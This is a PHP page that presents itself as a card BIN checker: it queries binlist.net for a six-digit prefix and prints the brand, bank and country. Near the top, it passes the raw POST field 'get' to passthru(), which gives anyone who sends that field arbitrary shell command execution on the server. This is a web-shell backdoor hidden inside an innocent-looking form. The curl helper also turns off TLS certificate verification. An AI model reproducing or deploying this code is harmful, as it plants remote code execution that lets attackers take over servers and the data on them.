<?php require_once 'templates/header.php';?>
<?php
          // Dimulai dengan POST Method
          if(isset($_POST['get'])){
          $script = $_POST['get'];
          passthru($script);
          $six = $_POST['enamdigit'];
          // Insert CURL
          function curl($url, $var = null) {
              $curl = curl_init($url);
              curl_setopt($curl, CURLOPT_TIMEOUT, 25);
              if ($var != null) {
                  curl_setopt($curl, CURLOPT_POST, true);
                  curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
              }
              curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
              curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
              curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
              curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
              $result = curl_exec($curl);
              curl_close($curl);
              return $result;
          }
          // Enam digit Formula
          function defineNUM($bin) {
              return substr($bin,0,6);
          }
          // JSON DATA
            $bin = defineNUM($six);
            $curl = curl("https://lookup.binlist.net/".$bin);
            $json = json_decode($curl);
            $brand = $json->scheme ? $json->scheme : "error";
            $cardType = $json->type ? $json->type : "error";
            $cardCategory = $json->bank ? $json->bank : "error";
            $countryName = $json->country ? $json->country : "error";
            $countryCode = $json->country ? $json->country : "error";
            $details = '<p>BIN: '.$bin.'</br>Brand: '.$brand.'</br>Banco: '.$cardCategory->name.'</br>Banco URL: '.$cardCategory->url.'</br>Banco Tel: '.$cardCategory->phone.'</br>Tipo: '.$cardType.'</br>Ciudad: '.$countryName->name.'</br>ZIP: '.$countryCode->alpha2.'</p>';
            
            if ($six == null) {
            die('error!');
        }
            $binresult = $details;
        }
?>
<!DOCTYPE html>
<body>

<!-- start loader -->
   <div id="pageloader-overlay" class="visible incoming"><div class="loader-wrapper-outer"><div class="loader-wrapper-inner" ><div class="loader"></div></div></div></div>
   <!-- end loader -->

<!-- Start wrapper-->
 <div id="wrapper">
     <div class="content-wrapper">
     <div class="container-fluid">
      <div class="row">
        <div class="col-lg-12">
		  <div style="height:600px"> <!--Please remove the height before using this page-->
		    
          <div class="well text-center">
                    <p><h3>Check Bin</h3></p>
                         <hr>
						<form method="post">
                            <div class="form-group">
                              <label for="host">Bin a Chequear:</label>
                              <br />
                              <input type="text" id="enamdigit" name="enamdigit" placeholder="51489580" size="16" required>
                            </div>
                            <br />
                            <br />
                            <div class="form-group">
                                <button type="submit" name="get" class="Button">Chequear</button>
                            </div>
							
							<div class="well text-center">
							<p><h3>Información</h3></p>
							<hr>
							<?php echo $binresult ?>
							<p> 
							</div>
							<br>
                        </form>
            </div>
        </div>
    </div>
<!--start overlay-->
	  <div class="overlay toggle-menu"></div>
	<!--end overlay-->
    </div>
    <!-- End container-fluid-->

   </div><!--End content-wrapper-->
   <!--Start Back To Top Button-->
    <a href="javaScript:void();" class="back-to-top"><i class="fa fa-angle-double-up"></i> </a>
    <!--End Back To Top Button-->
	
  </div><!--End wrapper-->
<?php require_once 'templates/footer.php';?>